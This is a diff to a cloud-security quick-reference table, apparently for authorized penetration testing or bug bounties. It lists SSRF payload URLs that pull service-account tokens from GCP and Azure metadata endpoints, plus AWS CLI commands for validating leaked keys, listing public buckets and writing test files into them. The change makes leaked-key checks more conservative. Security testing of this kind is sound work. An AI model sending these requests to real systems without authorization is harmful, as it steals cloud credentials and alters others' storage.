@@ -15,7 +15,7 @@ Quick-lookup card. Mechanics in `chapters/`; mindset in `SKILL.md`; terms in `gl
 | No-role check | `…/meta-data/iam/` | 404 = no role; empty 200 = revoked |
 | GCP metadata | `?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` w/ `Metadata-Flavor: Google` | OAuth token JSON |
 | Azure MSI | `?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01` w/ `Metadata: true` | instance JSON; `$IDENTITY_ENDPOINT` on App Service |
-| Leaked AWS key | `aws sts get-caller-identity` (once) | ARN + account ID → in scope? report |
+| Leaked AWS key | default: offline decode + report; `aws sts get-caller-identity` (once) only if policy authorizes credential validation | ARN + account ID → in scope? report |
 | Account ID from key | `aws sts get-access-key-info --access-key-id AKIA…` | 12-digit ID (logs to YOUR account) |
 | Public bucket | `aws s3 ls s3://NAME --no-sign-request` | listing = read exposure |
 | Bucket write | `echo poc \| aws s3 cp - s3://NAME/poc.txt` then `aws s3 rm` | write = supply-chain risk |
